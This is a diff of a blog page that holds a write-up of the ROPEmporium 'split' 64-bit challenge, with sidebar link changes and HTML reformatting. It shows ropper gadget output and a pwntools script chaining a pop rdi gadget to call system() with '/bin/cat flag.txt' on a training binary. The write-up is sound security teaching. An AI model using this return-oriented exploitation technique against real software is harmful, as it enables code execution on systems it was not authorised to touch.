@@ -206,6 +206,16 @@ if (!doNotTrack) {
     </a>
   </li>
 
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://thieunguyen5991.github.io/projects">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-product-hunt"></i>
+      
+      <span class="sidebar-button-desc">Projects</span>
+    </a>
+  </li>
+
 
     </ul>
     <ul class="sidebar-buttons">
@@ -217,16 +227,6 @@ if (!doNotTrack) {
       <i class="sidebar-button-icon fa fa-lg fa-github"></i>
       
       <span class="sidebar-button-desc">GitHub</span>
-    </a>
-  </li>
-
-  <li class="sidebar-button">
-    
-      <a class="sidebar-button-link " href="https://twitter.com/thieunguyen5991" target="_blank" rel="noopener">
-    
-      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
-      
-      <span class="sidebar-button-desc">Twitter</span>
     </a>
   </li>
 
@@ -320,50 +320,61 @@ if (!doNotTrack) {
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p>Before you read any further go back and have a look on my previous <a href="https://blog.securitybits.io/2019/08/ropemporium-0-ret2win-64-bit/">ROPEmporium</a> post, as this post will build on that knowledge. But also have some familiarity of</p>
+              
+
+<p>Before you read any further go back and have a look on my previous <a href="https://blog.securitybits.io/2019/08/ropemporium-0-ret2win-64-bit/">ROPEmporium</a> post, as this post will build on that knowledge. But also have some familiarity of</p>
+
 <ul>
 <li>GDB</li>
 <li>Radare2</li>
 <li>Assembly</li>
 </ul>
+
 <p>This round we&rsquo;ll use the same tools as in 0-ret2win, with the addition to <a href="https://github.com/sashs/Ropper">Ropper</a> as we have to find and use specific gadgets to make the 64-bit exploit.</p>
+
 <h2 id="description">Description</h2>
+
 <blockquote>
 <p>I&rsquo;ll let you in on a secret; that useful string &ldquo;/bin/cat flag.txt&rdquo; is still present in this binary, as is a call to system(). It&rsquo;s just a case of finding them and chaining them together to make the magic happen.</p>
 </blockquote>
+
 <h2 id="setup">Setup</h2>
+
 <p>Again lets download and do some initial analysis of the binary</p>
 <pre><code>root@linux:~/split# wget https://ropemporium.com/binary/split.zip
 root@linux:~/split# unzip split.zip
 root@linux:~/split# ls
 flag.txt split split.zip
 root@linux:~/split# file split
-split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8cbc19d1114b70bce2305f7ded9e7dd4d2e28069, not stripped
-</code></pre><p>Awesome, still not stripped and we downloaded the proper 64-bit ELF Executable. We can also execute it to look on the program execution flow and what input data it wants.</p>
+split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8cbc19d1114b70bce2305f7ded9e7dd4d2e28069, not stripped</code></pre>
+<p>Awesome, still not stripped and we downloaded the proper 64-bit ELF Executable. We can also execute it to look on the program execution flow and what input data it wants.</p>
 <pre><code>root@Valkyrie:~/Documents/courses/ropemporium/1-split# ./split
 split by ROP Emporium
 64bits
 Contriving a reason to ask user for data...
 &gt; inputdata
-Exiting
-</code></pre><p>So the basic flow is similar to ret2win, no surprise there as this exercise is more looking at the assembly, but again the user is required to input data after the <em>&quot;&gt; &ldquo;</em>. Much like 0-Ret2Win the offset to our junk in order to control RIP is 40 bytes, and i am intentionally skipping the details in this step to focus more on the ROP Chain.</p>
+Exiting</code></pre>
+<p>So the basic flow is similar to ret2win, no surprise there as this exercise is more looking at the assembly, but again the user is required to input data after the <em>&ldquo;&gt; &ldquo;</em>. Much like 0-Ret2Win the offset to our junk in order to control RIP is 40 bytes, and i am intentionally skipping the details in this step to focus more on the ROP Chain.</p>
+
 <p>So again create the exploit template using pwntools</p>
 <pre><code>root@Valkyrie:~/Documents/courses/ropemporium/1-split# \
-&gt; pwn template --host 127.0.0.1 --port 31337 split --quiet &gt; exploit.py
-</code></pre><p>And again keeping with the standard, adding the 40-byte junk and payload definition</p>
+&gt; pwn template --host 127.0.0.1 --port 31337 split --quiet &gt; exploit.py</code></pre>
+<p>And again keeping with the standard, adding the 40-byte junk and payload definition</p>
 <pre><code>[...snip...]
 # -- Exploit goes here --
-junk = 'A'*40
+junk = &#39;A&#39;*40
 
-payload = &quot;&quot;
+payload = &#34;&#34;
 payload += junk
 
 io = start()
-io.recvuntil('&gt; ')
+io.recvuntil(&#39;&gt; &#39;)
 io.sendline(payload)
-io.interactive()
-</code></pre><p>So lets start reversing the binary and look for the gadgets that we have to use.</p>
+io.interactive()</code></pre>
+<p>So lets start reversing the binary and look for the gadgets that we have to use.</p>
+
 <h2 id="radare2-reversing">Radare2 Reversing</h2>
+
 <p>Analyzing the binary first with rabin2, to have a look on its protections we can see that the <code>nx: true</code> also that <code>stripped: false</code> . So again a ROP Chain is the key to success!</p>
 <pre><code>root@Valkyrie:~/Documents/courses/ropemporium/1-split# rabin2 -I split
 arch x86
@@ -396,8 +407,9 @@ sanitiz false
 static false
 stripped false
 subsys linux
-va true
-</code></pre><p>So lets open the binary in Radare2 and look for our ROP Chain.</p>
+va true</code></pre>
+<p>So lets open the binary in Radare2 and look for our ROP Chain.</p>
+
 
 
  
@@ -425,7 +437,9 @@ va true
   
 </div>
 
+
 <p>So in the challenge description we got the hint that there are still a useful function, but also a useful string which have been split apart! Investigating both the <code>sym.usefulFunction</code> and <code>obj.usefulString</code> we can slowly see the parts that we have to use in order to print the <code>flag.txt</code>.</p>
+
 
 
  
@@ -453,7 +467,9 @@ va true
   
 </div>
 
+
 <p>Above is the function in 1-split that contains the gadget system, but it&rsquo;s also apparent that it wont print us the flag by simply calling the function. Since the edi will be filled with the pointer to the string <code>str.bin_ls</code> (/bin/ls) and will thus only print out the files in the current directory. While this proves code execution or command injection&hellip; doesn&rsquo;t help us getting that flag! What we really want is to call the obj.usefulString as an argument to system</p>
+
 
 
  
@@ -481,9 +497,13 @@ va true
   
 </div>
 
+
 <p>That will certainly print us the flag. But the next question is&hellip;. how can we change the calling string to system if it is hard coded into the binary?</p>
+
 <h3 id="anatomy-of-a-rop-chain">Anatomy of a ROP Chain</h3>
-<p>Now in order to dig a little into the calling convention of system calls in Linux we have to consult the ever exiting man page. Running <code>man system</code> in a terminal we are presented the manual for the library function <code>system()</code>.  </p>
+
+<p>Now in order to dig a little into the calling convention of system calls in Linux we have to consult the ever exiting man page. Running <code>man system</code> in a terminal we are presented the manual for the library function <code>system()</code>. &nbsp;</p>
+
 
 
  
@@ -511,26 +531,31 @@ va true
   
 </div>
 
+
 <p>If we have a brief look into the description of the system call, we can identify that the calling convention is <code>system(&lt;string of what to be executed&gt;)</code> , so the first parameter is the command to run. Which follows the principle in <code>sym.usefulFunction</code> as the string before system is <code>/bin/ls</code>. Which in turn is placed in the <code>edi</code> register just before the call to <code>system()</code></p>
 <pre><code>sym.usefulFunction ();
-0x0040080b bfff084000 mov edi, str.bin_ls ;0x4008ff ; &quot;/bin/ls&quot; ; const char *string
-0x00400810 e8cbfdffff call sym.imp.system ;int system(const char *string)
-</code></pre><p>Now there&rsquo;s a really good paper <a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf">x64-Cheatsheet.pdf</a> which explains a lot of the calls and methods in 64-bit assembly. A direct quote in the paper states that</p>
+0x0040080b bfff084000 mov edi, str.bin_ls ;0x4008ff ; &#34;/bin/ls&#34; ; const char *string
+0x00400810 e8cbfdffff call sym.imp.system ;int system(const char *string)</code></pre>
+<p>Now there&rsquo;s a really good paper <a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf">x64-Cheatsheet.pdf</a> which explains a lot of the calls and methods in 64-bit assembly. A direct quote in the paper states that</p>
+
 <blockquote>
-<p>4.3 Register Usage<br>
+<p>4.3 Register Usage<br />
 Additionally, %rdi, %rsi, %rdx, %rcx, %r8, and %r9 are used to pass the first six integer or pointer parameters to called functions. Additional parameters (or large parameters such as structs passed by value) are passed on the stack.</p>
 </blockquote>
+
 <p>Which means that it should look something like:</p>
 <pre><code>+-----------------------------------------------------------+
 | Call      First   Second  Third   Fourth  Fifth   Sixth   |
 | System()  %rdi    %rsi    %rdx    %rcx    %r8     %r9     |
-+-----------------------------------------------------------+
-</code></pre><p>Now we know that we need to move <code>obj.usefulString</code> into the first argument before calling <code>system()</code>, which should correlate to the <code>%RDI Register</code>, And there are three basic ways to achieve this and move data around in assembly:</p>
++-----------------------------------------------------------+</code></pre>
+<p>Now we know that we need to move <code>obj.usefulString</code> into the first argument before calling <code>system()</code>, which should correlate to the <code>%RDI Register</code>, And there are three basic ways to achieve this and move data around in assembly:</p>
+
 <ul>
 <li>push - push register onto top of stack</li>
 <li>pop - pop top of stack onto register</li>
 <li>mov - move source to destination</li>
 </ul>
+
 <p>But scrolling through the radare2 assembly can be a bit tedious, and there are a search function in radare2 to look for gadgets and specific calls, but its time to introduce ropper which will automagically find all the gadgets available to us in the binary or a glibc (though not necessary in the ROPEmporium challenges). So hunting for gadgets can be a bit tricky, as it usually requires to have a bunch of information and make assumptions as you go. luckily for us this time we only need one gadget this time, a <code>pop rdi</code>.</p>
 <pre><code>root@Valkyrie:~/Documents/courses/ropemporium/1-split# ropper -f split
 [INFO] Load gadgets from cache
@@ -543,8 +568,9 @@ Gadgets
 0x0000000000400883: pop rdi; ret;
 0x0000000000400881: pop rsi; pop r15; ret;
 [...snip...]
-91 gadgets found
-</code></pre><p>Ropper identified that on address <code>0x00400883</code> theres a <code>pop rdi; ret</code>, which is easily verified in radare2 with <code>pdi 2 @ 0x00400883</code></p>
+91 gadgets found</code></pre>
+<p>Ropper identified that on address <code>0x00400883</code> theres a <code>pop rdi; ret</code>, which is easily verified in radare2 with <code>pdi 2 @ 0x00400883</code></p>
+
 
 
  
@@ -572,20 +598,28 @@ Gadgets
   
 </div>
 
+
 <h3 id="constructing-the-rop-chain">Constructing the ROP Chain</h3>
+
 <p>Now that we&rsquo;ve identified the 3 parts we need in order to print the flag, its due time to start the assembly (No pun intended). This is something that we have to do in a specific order, which is more important in the later challenges but easier to understand now.</p>
+
 <p>In order to call system with the string, we need to place the string into the RDI register before the system call. And since the <code>pop rdi</code> takes the <em>next stack address</em> and pops it into the register, the pop call needs to be right before the string address. so the chain have to look something like this</p>
-<pre><code>[junk] + [pop rdi] + [usefulString] + [system]
-</code></pre><p>Which is easily constructed in our exploit code, now that we have all the parts needed.</p>
+<pre><code>[junk] + [pop rdi] + [usefulString] + [system]</code></pre>
+<p>Which is easily constructed in our exploit code, now that we have all the parts needed.</p>
+
 <h2 id="split">Split</h2>
+
 <p>This time we&rsquo;ll go straight to pwntools, but you can substitute the names for binary addresses if you want. So the different parts we need just to reiterate are</p>
+
 <ul>
 <li>Junk - which is <code>'A'*40</code> in order to control RIP and execute our own addresses</li>
 <li>usefulString - <code>exe.symbols.usefulString</code> the address to <code>/bin/cat flag.txt</code></li>
 <li>System() - <code>exe.symbols.system</code> to create the system call</li>
 <li>pop rdi - <code>0x00400883</code> to put the next stack address onto the proper register</li>
 </ul>
+
 <p>And in the final exploit we&rsquo;ll use pwntools function p64(address) in order to convert a memory address into a packed string.</p>
+
 <h3 id="final-exploit">Final Exploit</h3>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#Author: Christoffer.Claesson@Securitybits.io</span>
 <span style="color:#75715e">#Blog: https://blog.securitybits.io/2019/08/10/ropemporium-1-split-64-bit/</span>
@@ -640,8 +674,8 @@ payload <span style="color:#f92672">+=</span> system
 io <span style="color:#f92672">=</span> start()
 io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&gt; &#39;</span>)
 io<span style="color:#f92672">.</span>sendline(payload)
-log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;Flag: &#39;</span> <span style="color:#f92672">+</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">512</span>))
-</code></pre></div>
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;Flag: &#39;</span> <span style="color:#f92672">+</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">512</span>))</code></pre></div>
+
 
  
   
@@ -667,6 +701,7 @@ log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;
     <span class="caption">Flag</span>
   
 </div>
+
 
 <p>GitHub: <a href="https://github.com/Securitybits-io/ROPEmporium">https://github.com/Securitybits-io/ROPEmporium</a></p>
 
